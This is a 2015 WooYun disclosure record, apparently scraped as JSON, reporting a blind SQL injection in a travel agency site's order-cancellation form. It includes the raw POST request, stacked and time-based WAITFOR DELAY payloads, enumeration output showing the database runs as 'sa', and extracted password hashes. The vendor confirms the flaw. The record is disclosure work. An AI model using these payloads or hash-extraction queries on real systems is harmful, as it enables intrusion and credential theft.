{"id": 26016, "wybug_id": "wooyun-2015-0129883", "wybug_title": "中国国旅某站sql盲注漏洞", "wybug_corp": "中国国旅", "wybug_author": "Zacker", "wybug_date": "2015-07-28 10:38", "wybug_open_date": "2015-09-14 11:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向公众公开  简要描述： 带来sql盲注一枚 详细说明：  站点uri：http://new.citsbj.com\nPOST /Personal/CancelOrder HTTP/1.1Host: new.citsbj.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://new.citsbj.com/Personal/OrderCenterContent-Length: 100Cookie: citsbj_ssid=***Connection: keep-alivePragma: no-cacheCache-Control: no-cacheoid=70458&type=&reason=%E7%8E%B0%E5%9C%A8%E4%B8%8D%E6%83%B3%E8%B4%AD%E4%B9%B0&rnd=0.3115732066780511\nreason参数为盲注点~   漏洞证明：  \n---Place: POSTParameter: reason    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: oid=70460&type=&reason=现在不想购买'; WAITFOR DELAY '0:0:5';-- AND 'EPOT'='EPOT&rnd=0.831191517823377    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: oid=70460&type=&reason=现在不想购买' WAITFOR DELAY '0:0:5'-- AND 'aMwg'='aMwg&rnd=0.831191517823377---the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2008current user:    'sa'current database:    'AwtripWeb'users:    ##MS_PolicyEventProcessingLogin##  ##MS_PolicyTsqlExecutionLogin##awtripdistributor_adminsa[SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='##MS_PolicyEventProcessingLogin##' AND password_hash NOT IN (SELECT TOP 0 password_hash FROM sys.sql_logins WHERE name='##MS_PolicyEventProcessingLogin##' ORDER BY password_hash) ORDER BY password_hash][0x020091073b4ac756b3fbfcd74b30dd54681d5305a7e9cc8638d461f96230be0a5fa29fe6122afb3aaedb9743835de7bc64963bae41d1a3351c6eafe49e58c707d0bbdbf10659][SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='##MS_PolicyTsqlExecutionLogin##' AND password_hash NOT IN (SELECT TOP 0 password_hash FROM sys.sql_logins WHERE name='##MS_PolicyTsqlExecutionLogin##' ORDER BY password_hash) ORDER BY password_hash][0x0200c16f8f3cda9cb77950589873e7a286c1520d93387127216eaaa494269d7a7328db29a34e26927f4c842109dc355fbc5868b0377afb63cd9a0e50c7a7d1f76499a0fc30bf]\n用户名、数据库名、密码hash（盲注太慢了，只跑了两个用户的密码hash，但是能说明问题了）   修复方案：  sql注入修复嘛，你们比我懂！1、特殊符号转义、过滤2、参数化查询3、要遵循最小权限原则，别用sa用户！！   版权声明：转载请注明来源 Zacker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-07-31 11:15 厂商回复： 非常感谢您的报告，问题已处理,十分感谢您对中国国旅的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}